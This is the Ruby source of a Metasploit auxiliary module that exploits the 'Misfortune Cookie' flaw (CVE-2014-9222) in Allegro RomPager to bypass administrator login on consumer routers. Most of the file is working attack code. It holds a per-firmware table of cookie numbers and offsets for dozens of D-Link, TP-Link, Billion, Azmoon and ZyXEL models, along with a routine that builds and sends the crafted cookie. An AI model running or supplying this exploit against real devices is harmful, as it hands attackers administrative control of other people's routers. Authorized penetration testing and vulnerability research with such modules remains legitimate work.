##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(
              info,
              'Name' => "Allegro Software RomPager 'Misfortune Cookie' (CVE-2014-9222) Authentication bypass",
              'Description' => %q(
        This module exploits HTTP servers that appear to be vulnerable to the
        'Misfortune Cookie' vulnerability which affects Allegro Software
        Rompager versions before 4.34 and can allow attackers to authenticate
        to the HTTP service as an administrator without providing valid
        credentials.
      ),
              'Author' => [
                  'Jon Hart <jon_hart[at]rapid7.com>', # metasploit scanner module
                  'Jan Trencansky <jan.trencansky[at]gmail.com>', # metasploit auxiliary admin module
                  'Lior Oppenheim' # CVE-2014-9222
              ],
              'References' => [
                  ['CVE', '2014-9222'],
                  ['URL', 'http://mis.fortunecook.ie'],
                  ['URL', 'http://mis.fortunecook.ie/misfortune-cookie-suspected-vulnerable.pdf'], # list of likely vulnerable devices
                  ['URL', 'http://mis.fortunecook.ie/too-many-cooks-exploiting-tr069_tal-oppenheim_31c3.pdf'] # 31C3 presentation with POC
              ],
              'DisclosureDate' => 'Dec 17 2014',
              'License' => MSF_LICENSE
          ))

    register_options(
        [
            OptString.new('TARGETURI', [true, 'URI to test', '/']),
            OptInt.new('device',[true, 'ID of device from list of vulnerable devices'])
        ], Exploit::Remote::HttpClient
    )
  end

  def headers
    {
        'Referer' => full_uri
    }
  end

  # List of known values and models, couldn't find better solution how to store them
  def devices_list
    [
        {:name=> 'Azmoon', :model=>'AZ-D140W', :fw=>'2.11.89.0(RE2.C29)3.11.11.52_PMOFF.1', :number=> 107367693,
         :offset=> 13},  # 0x803D5A79        # tested
        {:name=> 'Billion', :model=>'BiPAC 5102S', :fw=>'Av2.7.0.23 (UE0.B1C)', :number=> 107369694, :offset=> 13},
        # 0x8032204d                       # ----------
        {:name=> 'Billion', :model=>'BiPAC 5102S', :fw=>'Bv2.7.0.23 (UE0.B1C)', :number=> 107369694, :offset=> 13},
        # 0x8032204d                       # ----------
        {:name=> 'Billion', :model=>'BiPAC 5200', :fw=>'2.11.84.0(UE2.C2)3.11.11.6', :number=> 107369545,
         :offset=> 9},  # 0x803ec2ad                  # ----------
        {:name=> 'Billion', :model=>'BiPAC 5200', :fw=>'2_11_62_2_ UE0.C2D_3_10_16_0', :number=> 107371218,
         :offset=> 21},  # 0x803c53e5               # ----------
        {:name=> 'Billion', :model=>'BiPAC 5200A', :fw=>'2_10_5 _0(RE0.C2)3_6_0_0', :number=> 107366366,
         :offset=> 25},  # 0x8038a6e1                   # ----------
        {:name=> 'Billion', :model=>'BiPAC 5200A', :fw=>'2_11_38_0 (RE0.C29)3_10_5_0', :number=> 107371453,
         :offset=> 9},  # 0x803b3a51                 # ----------
        {:name=> 'Billion', :model=>'BiPAC 5200GR4', :fw=>'2.11.91.0(RE2.C29)3.11.11.52', :number=> 107367690,
         :offset=> 21},  # 0x803D8A51               # tested
        {:name=> 'Billion', :model=>'BiPAC 5200SRD', :fw=>'2.10.5.0 (UE0.C2C) 3.6.0.0', :number=> 107368270,
         :offset=> 1},  # 0x8034b109                  # ----------
        {:name=> 'Billion', :model=>'BiPAC 5200SRD', :fw=>'2.12.17.0_UE2.C3_3.12.17.0', :number=> 107371378,
         :offset=> 37},  # 0x8040587d                 # ----------
        {:name=> 'Billion', :model=>'BiPAC 5200SRD', :fw=>'2_11_62_2(UE0.C3D)3_11_11_22', :number=> 107371218,
         :offset=> 13},  # 0x803c49d5                # ----------
        {:name=> 'D-Link', :model=>'DSL-2520U', :fw=>'Z1 1.08 DSL-2520U_RT63261_Middle_East_ADSL',
         :number=> 107368902, :offset=> 25},  # 0x803fea01  # tested
        {:name=> 'D-Link', :model=>'DSL-2600U', :fw=>'Z1_DSL-2600U', :number=> 107366496, :offset=> 13},
        # 0x8040637d                                # ----------
        {:name=> 'D-Link', :model=>'DSL-2600U', :fw=>'Z2_V1.08_ras', :number=> 107360133, :offset=> 20},
        # 0x803389B0                                # ----------
        {:name=> 'TP-Link', :model=>'TD-8616', :fw=>'V2_080513', :number=> 107371483, :offset=> 21},
        # 0x80397055                                   # ----------
        {:name=> 'TP-Link', :model=>'TD-8816', :fw=>'V4_100528_Russia', :number=> 107369790, :offset=> 17},
        # 0x803ae0b1                            # ----------
        {:name=> 'TP-Link', :model=>'TD-8816', :fw=>'V4_100524', :number=> 107369790, :offset=> 17},
        # 0x803ae0b1                                   # ----------
        {:name=> 'TP-Link', :model=>'TD-8816', :fw=>'V5_100528_Russia', :number=> 107369790, :offset=> 17},
        # 0x803ae0b1                            # ----------
        {:name=> 'TP-Link', :model=>'TD-8816', :fw=>'V5_100524', :number=> 107369790, :offset=> 17},
        # 0x803ae0b1                                   # tested
        {:name=> 'TP-Link', :model=>'TD-8816', :fw=>'V5_100903', :number=> 107369790, :offset=> 17},
        # 0x803ae0b1                                   # ----------
        {:name=> 'TP-Link', :model=>'TD-8816', :fw=>'V6_100907', :number=> 107371426, :offset=> 17},
        # 0x803c6e09                                   # ----------
        {:name=> 'TP-Link', :model=>'TD-8816', :fw=>'V7_111103', :number=> 107371161, :offset=> 1},
        # 0x803e1bd5                                    # ----------
        {:name=> 'TP-Link', :model=>'TD-8816', :fw=>'V7_130204', :number=> 107370211, :offset=> 5},
        # 0x80400c85                                    # ----------
        {:name=> 'TP-Link', :model=>'TD-8817', :fw=>'V5_100524', :number=> 107369790, :offset=> 17},
        # 0x803ae0b1                                   # ----------
        {:name=> 'TP-Link', :model=>'TD-8817', :fw=>'V5_100702_TR', :number=> 107369790, :offset=> 17},
        # 0x803ae0b1                                # ----------
        {:name=> 'TP-Link', :model=>'TD-8817', :fw=>'V5_100903', :number=> 107369790, :offset=> 17},
        # 0x803ae0b1                                   # ----------
        {:name=> 'TP-Link', :model=>'TD-8817', :fw=>'V6_100907', :number=> 107369788, :offset=> 1},
        # 0x803b6e09                                    # ----------
        {:name=> 'TP-Link', :model=>'TD-8817', :fw=>'V6_101221', :number=> 107369788, :offset=> 1},
        # 0x803b6e09                                    # ----------
        {:name=> 'TP-Link', :model=>'TD-8817', :fw=>'V7_110826', :number=> 107369522, :offset=> 25},
        # 0x803d1bd5                                   # ----------
        {:name=> 'TP-Link', :model=>'TD-8817', :fw=>'V7_130217', :number=> 107369316, :offset=> 21},
        # 0x80407625                                   # ----------
        {:name=> 'TP-Link', :model=>'TD-8817', :fw=>'V7_120509', :number=> 107369321, :offset=> 9},
        # 0x803fbcc5                                    # tested
        {:name=> 'TP-Link', :model=>'TD-8817', :fw=>'V8_140311', :number=> 107351277, :offset=> 20},
        # 0x8024E148                                   # tested
        {:name=> 'TP-Link', :model=>'TD-8820', :fw=>'V3_091223', :number=> 107369768, :offset=> 17},
        # 0x80397E69                                   # tested
        {:name=> 'TP-Link', :model=>'TD-8840T', :fw=>'V1_080520', :number=> 107369845, :offset=> 5},
        # 0x80387055                                    # ----------
        {:name=> 'TP-Link', :model=>'TD-8840T', :fw=>'V2_100525', :number=> 107369790, :offset=> 17},
        # 0x803ae0b1                                   # tested
        {:name=> 'TP-Link', :model=>'TD-8840T', :fw=>'V2_100702_TR', :number=> 107369790, :offset=> 17},
        # 0x803ae0b1                                # ----------
        {:name=> 'TP-Link', :model=>'TD-8840T', :fw=>'V2_090609', :number=> 107369570, :offset=> 1},
        # 0x803c65d5                                    # ----------
        {:name=> 'TP-Link', :model=>'TD-8840T', :fw=>'V3_101208', :number=> 107369766, :offset=> 17},
        # 0x803c3e89                                    # tested
        {:name=> 'TP-Link', :model=>'TD-8840T', :fw=>'V3_110221', :number=> 107369764, :offset=> 5},
        # 0x803d1a09                                    # ----------
        {:name=> 'TP-Link', :model=>'TD-8840T', :fw=>'V3_120531', :number=> 107369688, :offset=> 17},
        # 0x803fed35                                   # ----------
        {:name=> 'TP-Link', :model=>'TD-W8101G', :fw=>'V1_090107', :number=> 107367772, :offset=> 37},
        # 0x803bf701                                   # ----------
        {:name=> 'TP-Link', :model=>'TD-W8101G', :fw=>'V1_090107', :number=> 107367808, :offset=> 21},
        # 0x803e5b6d                                   # ----------
        {:name=> 'TP-Link', :model=>'TD-W8101G', :fw=>'V2_100819', :number=> 107367751, :offset=> 21},
        # 0x803dc701                                   # ----------
        {:name=> 'TP-Link', :model=>'TD-W8101G', :fw=>'V2_101015_TR', :number=> 107367749, :offset=> 13},
        # 0x803e1829                                # ----------
        {:name=> 'TP-Link', :model=>'TD-W8101G', :fw=>'V2_101101', :number=> 107367749, :offset=> 13},
        # 0x803e1829                                   # ----------
        {:name=> 'TP-Link', :model=>'TD-W8101G', :fw=>'V3_110119', :number=> 107367765, :offset=> 25},
        # 0x804bb941                                   # ----------
        {:name=> 'TP-Link', :model=>'TD-W8101G', :fw=>'V3_120213', :number=> 107367052, :offset=> 25},
        # 0x804e1ff9                                   # ----------
        {:name=> 'TP-Link', :model=>'TD-W8101G', :fw=>'V3_120604', :number=> 107365835, :offset=> 1},
        # 0x804f16a9                                    # ----------
        {:name=> 'TP-Link', :model=>'TD-W8151N', :fw=>'V3_120530', :number=> 107353867, :offset=> 24},
        # 0x8034F3A4                                   # tested
        {:name=> 'TP-Link', :model=>'TD-W8901G', :fw=>'V1_080522', :number=> 107367787, :offset=> 21},
        # 0x803AB30D                                   # tested
        {:name=> 'TP-Link', :model=>'TD-W8901G', :fw=>'V1,2_080522', :number=> 107368013, :offset=> 5},
        # 0x803AB30D                                  # ----------
        {:name=> 'TP-Link', :model=>'TD-W8901G', :fw=>'V2_090113_Turkish', :number=> 107368013, :offset=> 5},
        # 0x803AB30D                            # ----------
        {:name=> 'TP-Link', :model=>'TD-W8901G', :fw=>'V3_140512', :number=> 107367854, :offset=> 9},
        # 0x803cf335                                    # tested
        {:name=> 'TP-Link', :model=>'TD-W8901G', :fw=>'V3_100603', :number=> 107367751, :offset=> 21},
        # 0x803DC701                                   # tested
        {:name=> 'TP-Link', :model=>'TD-W8901G', :fw=>'V3_100702_TR', :number=> 107367751, :offset=> 21},
        # 0x803DC701                                # tested
        {:name=> 'TP-Link', :model=>'TD-W8901G', :fw=>'V3_100901', :number=> 107367749, :offset=> 13},
        # 0x803E1829                                   # tested
        {:name=> 'TP-Link', :model=>'TD-W8901G', :fw=>'V6_110119', :number=> 107367765, :offset=> 25},
        # 0x804BB941                                   # tested
        {:name=> 'TP-Link', :model=>'TD-W8901G', :fw=>'V6_110915', :number=> 107367682, :offset=> 21},
        # 0x804D7CB9                                   # tested
        {:name=> 'TP-Link', :model=>'TD-W8901G', :fw=>'V6_120418', :number=> 107365835, :offset=> 1},
        # 0x804F16A9                                    # ----------
        {:name=> 'TP-Link', :model=>'TD-W8901G', :fw=>'V6_120213', :number=> 107367052, :offset=> 25},
        # 0x804E1FF9                                   # ----------
        {:name=> 'TP-Link', :model=>'TD-W8901GB', :fw=>'V3_100727', :number=> 107367756, :offset=> 13},
        # 0x803dfbe9                                   # ----------
        {:name=> 'TP-Link', :model=>'TD-W8901GB', :fw=>'V3_100820', :number=> 107369393, :offset=> 21},
        # 0x803f1719                                   # ----------
        {:name=> 'TP-Link', :model=>'TD-W8901N', :fw=>'V1_111211', :number=> 107353880, :offset=> 0},
        # 0x8034FF94                                   # tested
        {:name=> 'TP-Link', :model=>'TD-W8951ND', :fw=>'V1_101124,100723,100728', :number=> 107369839, :offset=> 25},
        # 0x803d2d61                     # tested
        {:name=> 'TP-Link', :model=>'TD-W8951ND', :fw=>'V1_110907', :number=> 107369876, :offset=> 13},
        # 0x803d6ef9                                   # ----------
        {:name=> 'TP-Link', :model=>'TD-W8951ND', :fw=>'V1_111125', :number=> 107369876, :offset=> 13},
        # 0x803d6ef9                                   # ----------
        {:name=> 'TP-Link', :model=>'TD-W8951ND', :fw=>'V3.0_110729_FI', :number=> 107366743, :offset=> 21},
        # 0x804ef189                              # ----------
        {:name=> 'TP-Link', :model=>'TD-W8951ND', :fw=>'V3_110721', :number=> 107366743, :offset=> 21},
        # 0x804ee049                                   # ----------
        {:name=> 'TP-Link', :model=>'TD-W8951ND', :fw=>'V3_20110729_FI', :number=> 107366743, :offset=> 21},
        # 0x804ef189                              # ----------
        {:name=> 'TP-Link', :model=>'TD-W8951ND', :fw=>'V4_120511', :number=> 107364759, :offset=> 25},
        # 0x80523979                                  # tested
        {:name=> 'TP-Link', :model=>'TD-W8951ND', :fw=>'V4_120607', :number=> 107364759, :offset=> 13},
        # 0x80524A91                                   # tested
        {:name=> 'TP-Link', :model=>'TD-W8951ND', :fw=>'V4_120912_FL', :number=> 107364760, :offset=> 21},
        # 0x80523859                                # tested
        {:name=> 'TP-Link', :model=>'TD-W8961NB', :fw=>'V1_110107', :number=> 107369844, :offset=> 17},
        # 0x803de3f1                                   # tested
        {:name=> 'TP-Link', :model=>'TD-W8961NB', :fw=>'V1_110519', :number=> 107369844, :offset=> 17},
        # 0x803de3f1                                   # ----------
        {:name=> 'TP-Link', :model=>'TD-W8961NB', :fw=>'V2_120319', :number=> 107367629, :offset=> 21},
        # 0x80531859                                   # ----------
        {:name=> 'TP-Link', :model=>'TD-W8961NB', :fw=>'V2_120823', :number=> 107366421, :offset=> 13},
        # 0x80542e59                                   # ----------
        {:name=> 'TP-Link', :model=>'TD-W8961ND', :fw=>'V1_100722,101122', :number=> 107369839, :offset=> 25},
        # 0x803D2D61                            # tested
        {:name=> 'TP-Link', :model=>'TD-W8961ND', :fw=>'V1_101022_TR', :number=> 107369839, :offset=> 25},
        # 0x803D2D61                                # ----------
        {:name=> 'TP-Link', :model=>'TD-W8961ND', :fw=>'V1_111125', :number=> 107369876, :offset=> 13},
        # 0x803D6EF9                                   # ----------
        {:name=> 'TP-Link', :model=>'TD-W8961ND', :fw=>'V2_120427', :number=> 107364732, :offset=> 25},
        # 0x8052e0e9                                   # ----------
        {:name=> 'TP-Link', :model=>'TD-W8961ND', :fw=>'V2_120710_UK', :number=> 107364771, :offset=> 37},
        # 0x80523AA9                                # ----------
        {:name=> 'TP-Link', :model=>'TD-W8961ND', :fw=>'V2_120723_FI', :number=> 107364762, :offset=> 29},
        # 0x8052B6B1                                # ----------
        {:name=> 'TP-Link', :model=>'TD-W8961ND', :fw=>'V3_120524,120808', :number=> 107353880, :offset=> 0},
        # 0x803605B4                             # ----------
        {:name=> 'TP-Link', :model=>'TD-W8961ND', :fw=>'V3_120830', :number=> 107353414, :offset=> 36},
        # 0x803605B4                                   # ----------
        {:name=> 'ZyXEL', :model=>'P-660R-T3', :fw=>'3.40(BOQ.0)C0', :number=> 107369567, :offset=> 21},
        # 0x803db071                               # tested
        {:name=> 'ZyXEL', :model=>'P-660RU-T3', :fw=>'3.40(BJR.0)C0', :number=> 107369567, :offset=> 21}
    ]
  end

  def auxiliary_commands
    { "devices" => "List known vulnerable devices" }
  end

  # Command for listing all devivces with known values, for bypass to work
  def cmd_devices(*args)
    tbl =	Msf::Ui::Console::Table.new(
        Msf::Ui::Console::Table::Style::Default,
        'Header'  => "List of vulnerable devices",
        'Prefix'  => "\n",
        'Postfix' => "\n",
        'Columns' =>
            [
                'ID',
                'Name',
                'Model',
                'Firmware',
                'Number',
                'Offset'
            ])
    counter = 0
    for device in devices_list
      tbl << [counter, device[:name], device[:model], device[:fw], device[:number], device[:offset] ]
      counter += 1
    end
    print tbl.to_s
  end

  def run
    cookie = ''
    begin
      cookie_number = devices_list[datastore['DEVICE']][:number].to_s
      cookie_offset = devices_list[datastore['DEVICE']][:offset]
      cookie = 'C' + cookie_number + '=' + 'B' * cookie_offset + "\x00"
    rescue
      print_error('Device number is out of range, please run devices to see list of vulnerable devices')
    end
    print_status('Device name: ' + devices_list[datastore['DEVICE']][:name])
    print_status('Device model: ' + devices_list[datastore['DEVICE']][:model])
    print_status('Device firmware: ' + devices_list[datastore['DEVICE']][:fw])
    res = send_request_raw(
        'uri' => normalize_uri(target_uri.path.to_s),
        'method' => 'GET',
        'headers' => headers.merge('Cookie' => cookie)
    )
    if res != nil and res.code <= 302 # This may give wrong results if run against non rom-pager devices
      print_good('Exploit sent, please check host, authentication should be disabled')
    else
      print_error('Exploit failed')
    end
  end
end
